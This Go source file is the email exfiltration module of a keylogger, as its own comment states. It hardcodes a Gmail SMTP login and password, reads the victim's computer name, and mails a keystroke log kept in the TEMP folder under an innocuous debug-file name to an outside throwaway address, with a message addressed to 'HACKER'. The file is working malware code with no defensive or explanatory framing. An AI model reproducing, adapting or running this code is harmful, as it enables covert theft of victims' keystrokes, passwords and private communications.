package email

import (
	"os"

	"gopkg.in/gomail.v2"
)

var (
	host       = "smtp.gmail.com"
	from       = "tester.123.pepito@gmail.com"
	password   = "adrenalina12"
	portNumber = 587
	path       = os.Getenv("TEMP")
	username   = os.Getenv("COMPUTERNAME")
)

//SendEmail sends the keylogger log by email
func SendEmail() {
	m := gomail.NewMessage()
	m.SetHeader("From", from)
	m.SetHeader("To", "vatir96616@zefara.com")
	m.SetHeader("Subject", "DATA FROM "+username)
	m.SetBody("text/html", "Hello <b>HACKER</b>!")
	m.Attach(path + "\\aria-debug-2608.log")

	d := gomail.NewPlainDialer(host, portNumber, from, password)
	if err := d.DialAndSend(m); err != nil {
		panic(err)
	}
}
